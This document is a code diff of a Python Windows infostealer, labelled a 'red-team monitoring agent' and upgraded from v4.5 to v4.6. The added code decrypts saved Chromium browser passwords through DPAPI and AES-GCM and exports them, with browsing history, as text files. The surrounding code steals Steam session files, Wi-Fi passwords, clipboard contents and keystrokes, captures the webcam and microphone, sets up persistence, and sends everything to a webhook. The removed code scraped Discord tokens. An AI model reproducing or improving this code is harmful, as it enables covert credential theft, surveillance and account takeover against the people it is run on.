@@ -1,5 +1,5 @@
 # =====================================================
-# ULTIMATE RED-TEAM MONITORING AGENT v4.5 - FULL COMPLETE
+# ULTIMATE RED-TEAM MONITORING AGENT v4.6 - TXT EXFIL
 # =====================================================
 import os
 import sys
@@ -26,6 +26,9 @@ import sounddevice as sd
 import wave
 from pynput.keyboard import Listener as KeyboardListener
 import pyautogui
+import sqlite3
+import win32crypt
+from Crypto.Cipher import AES
 
 # ================== CONFIG ==================
 CONFIG_FILE = "config.json"
@@ -62,12 +65,11 @@ def load_config():
                 return json.load(f)
         except:
             pass
-    return {"webhook": DEFAULT_WEBHOOK, "exfil_mode": "full", "encrypt": False, "send_dbs": True}
+    return {"webhook": DEFAULT_WEBHOOK, "exfil_mode": "full", "encrypt": False}
 
 config = load_config()
 WEBHOOK_URL = config.get("webhook", DEFAULT_WEBHOOK)
 ENCRYPT = config.get("encrypt", False)
-SEND_DBS = config.get("send_dbs", True)
 
 def encrypt_data(data):
     key = b'labagent2025x'
@@ -108,13 +110,36 @@ def add_persistence(script_path):
     except Exception as e:
         log(f"Persistence error: {e}")
 
+# ================== DECRYPTION HELPERS ==================
+def get_master_key(local_state_path):
+    try:
+        with open(local_state_path, "r", encoding="utf-8") as f:
+            data = json.load(f)
+        encrypted_key = base64.b64decode(data["os_crypt"]["encrypted_key"])[5:]
+        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+    except:
+        return None
+
+def decrypt_password(encrypted, master_key):
+    try:
+        if len(encrypted) < 15:
+            return "N/A"
+        if encrypted[:5] == b'v10' and master_key:
+            iv = encrypted[3:15]
+            ciphertext = encrypted[15:]
+            cipher = AES.new(master_key, AES.MODE_GCM, iv)
+            return cipher.decrypt(ciphertext)[:-16].decode('utf-8', errors='ignore')
+        else:
+            return win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8', errors='ignore')
+    except:
+        return "DECRYPT_FAILED"
+
 # ================== STEAM STEALER ==================
 def steal_steam_data():
     steam_data = {"accounts": {}, "sessions": {}, "config": {}, "files": [], "ssfn": []}
     steam_path = os.path.join(os.getenv('PROGRAMFILES(x86)'), r"Steam") or os.path.join(os.getenv('PROGRAMFILES'), r"Steam")
     if not os.path.exists(steam_path):
         return steam_data
-
     for f in os.listdir(steam_path):
         if f.startswith("ssfn"):
             try:
@@ -122,87 +147,79 @@ def steal_steam_data():
                     steam_data["ssfn"].append({"name": f, "data": base64.b64encode(sf.read()).decode()})
             except:
                 pass
-
     login_vdf = os.path.join(steam_path, "config", "loginusers.vdf")
     if os.path.exists(login_vdf):
         steam_data["accounts"] = open(login_vdf, "r", encoding="utf-8").read()[:8000]
-
     config_vdf = os.path.join(steam_path, "config", "config.vdf")
     if os.path.exists(config_vdf):
         steam_data["config"] = open(config_vdf, "r", encoding="utf-8").read()[:8000]
-
     for root, _, files in os.walk(os.path.join(steam_path, "config")):
         for file in files:
             if file.endswith(".vdf") or file.endswith(".bin"):
                 steam_data["files"].append(file)
     return steam_data
 
-# ================== BROWSER STEALER + REAL DB FILES ==================
-def steal_browser_data():
-    browser_data = {}
-    db_files = {}
-
+# ================== TXT BROWSER EXFIL (PASSWORDS + HISTORY) ==================
+def extract_browser_txt():
+    txt_files = {}
     for browser, base_path in BROWSER_PATHS.items():
         if not os.path.exists(base_path):
             continue
-        browser_data[browser] = {"profiles": {}}
-
-        if browser == "Firefox":
-            profiles = [d for d in os.listdir(base_path) if d.endswith('.default-release') or 'default' in d]
-        else:
-            profiles = ["Default"] + [d for d in os.listdir(base_path) if d.startswith("Profile")]
-
-        for profile in profiles[:3]:
+        for profile in ["Default"] + [d for d in os.listdir(base_path) if d.startswith("Profile") or "default" in d][:3]:
             profile_path = os.path.join(base_path, profile) if browser != "Firefox" else os.path.join(base_path, profile)
             if not os.path.exists(profile_path):
                 continue
 
-            p_data = {"passwords": "N/A", "cookies": "N/A", "history": "N/A", "discord_tokens": [], "crypto": []}
+            local_state = os.path.join(base_path, "Local State")
+            master_key = get_master_key(local_state) if os.path.exists(local_state) else None
 
-            temp_dir = tempfile.gettempdir()
-            db_list = [
-                ("passwords", "Login Data"),
-                ("cookies", "Network/Cookies" if browser != "Firefox" else "cookies.sqlite"),
-                ("history", "History")
-            ]
+            # PASSWORDS → TXT
+            login_db = os.path.join(profile_path, "Login Data")
+            if os.path.exists(login_db):
+                try:
+                    shutil.copy2(login_db, "temp_login.db")
+                    conn = sqlite3.connect("temp_login.db")
+                    cursor = conn.cursor()
+                    content = f"=== {browser} {profile} - PASSWORDS ===\n\n"
+                    for row in cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE password_value IS NOT NULL"):
+                        url, user, enc = row
+                        plain = decrypt_password(enc, master_key) if master_key else "ENCRYPTED"
+                        content += f"URL     : {url}\nUSER    : {user}\nPASS    : {plain}\n{'-'*80}\n"
+                    conn.close()
+                    os.remove("temp_login.db")
 
-            for db_name, db_rel_path in db_list:
-                src = os.path.join(profile_path, db_rel_path)
-                if os.path.exists(src):
-                    try:
-                        dest = os.path.join(temp_dir, f"{browser}_{profile}_{db_name}.db")
-                        shutil.copy2(src, dest)
-                        key = f"{browser}_{profile}_{db_name}.db"
-                        with open(dest, "rb") as f:
-                            db_files[key] = (key, f.read(), "application/octet-stream")
-                        p_data[db_name] = f"ATTACHED → {key} ({os.path.getsize(src)//1024} KB)"
-                    except Exception as e:
-                        p_data[db_name] = f"Error: {str(e)[:100]}"
+                    fname = f"{browser}_{profile}_PASSWORDS.txt"
+                    with open(fname, "w", encoding="utf-8") as f:
+                        f.write(content)
+                    with open(fname, "rb") as f:
+                        txt_files[fname] = (fname, f.read(), "text/plain")
+                    os.remove(fname)
+                except:
+                    pass
 
-            # Discord tokens
-            leveldb_path = os.path.join(profile_path, "Local Storage", "leveldb")
-            if os.path.exists(leveldb_path):
-                for root, _, files in os.walk(leveldb_path):
-                    for f in files:
-                        if f.endswith((".log", ".ldb")):
-                            try:
-                                content = open(os.path.join(root, f), "r", errors="ignore").read()
-                                if "mfa." in content or "token" in content.lower():
-                                    p_data["discord_tokens"].append(content[:400])
-                            except:
-                                pass
+            # HISTORY → TXT
+            history_db = os.path.join(profile_path, "History")
+            if os.path.exists(history_db):
+                try:
+                    shutil.copy2(history_db, "temp_hist.db")
+                    conn = sqlite3.connect("temp_hist.db")
+                    cursor = conn.cursor()
+                    content = f"=== {browser} {profile} - HISTORY (last 50) ===\n\n"
+                    for row in cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 50"):
+                        content += f"{row[0]} | {row[1]}\n"
+                    conn.close()
+                    os.remove("temp_hist.db")
 
-            # Crypto extensions
-            ext_path = os.path.join(profile_path, "Extensions")
-            if os.path.exists(ext_path):
-                p_data["extensions"] = [d for d in os.listdir(ext_path) if os.path.isdir(os.path.join(ext_path, d))][:10]
-                for wallet in ["nkbihfbeogaeaoehlefnkodbefgpgknn", "fhbohimaelbohpjglknkikb", "ffnbelfdoe"]:
-                    if wallet in str(p_data["extensions"]):
-                        p_data["crypto"].append(wallet)
+                    fname = f"{browser}_{profile}_HISTORY.txt"
+                    with open(fname, "w", encoding="utf-8") as f:
+                        f.write(content)
+                    with open(fname, "rb") as f:
+                        txt_files[fname] = (fname, f.read(), "text/plain")
+                    os.remove(fname)
+                except:
+                    pass
 
-            browser_data[browser]["profiles"][profile] = p_data
-
-    return browser_data, db_files
+    return txt_files
 
 # ================== OTHER MODULES ==================
 def get_system_info(vm_detected=False):
@@ -270,7 +287,6 @@ def capture_webcam_and_mic():
             files["webcam.jpg"] = ("webcam.jpg", buffer.tobytes(), "image/jpeg")
     except:
         pass
-
     try:
         fs = 44100
         recording = sd.rec(int(10 * fs), samplerate=fs, channels=1, dtype='int16')
@@ -315,7 +331,7 @@ def send_to_webhook(payload, files=None):
 
 # ================== MAIN LOOP ==================
 def main_loop(script_path):
-    log("=== AGENT v4.5 STARTED - REAL DB EXFIL ===")
+    log("=== AGENT v4.6 TXT EXFIL STARTED ===")
     add_persistence(script_path)
     stealth_mode()
 
@@ -332,18 +348,18 @@ def main_loop(script_path):
             info["clipboard"] = get_clipboard()
             info["wifi"] = get_wifi_passwords()
             info["steam"] = steal_steam_data()
-
-            browser_info, db_attachments = steal_browser_data()
-            info["browser"] = browser_info
             info["keylog"] = "".join(keylog_buffer[-300:]) or "N/A"
+            info["browser"] = "See attached .txt files (decrypted passwords + history)"
+
+            txt_attachments = extract_browser_txt()
 
             if ENCRYPT:
                 encrypted = encrypt_data(json.dumps(info, default=str))
-                payload = {"embeds": [{"title": "🛡️ AGENT v4.5 - ENCRYPTED", "description": encrypted[:1900], "color": 0x9900ff}]}
+                payload = {"embeds": [{"title": "🛡️ AGENT v4.6 - ENCRYPTED", "description": encrypted[:1900], "color": 0x9900ff}]}
             else:
-                payload = {"content": "**AGENT v4.5 REPORT**```json\n" + json.dumps(info, default=str, indent=2)[:1900] + "\n```"}
+                payload = {"content": "**AGENT v4.6 REPORT - TXT FILES**```json\n" + json.dumps(info, default=str, indent=2)[:1900] + "\n```"}
 
-            files = db_attachments.copy()
+            files = txt_attachments.copy()
 
             if ss_count % (SCREENSHOT_INTERVAL // INTERVAL) == 0:
                 try:
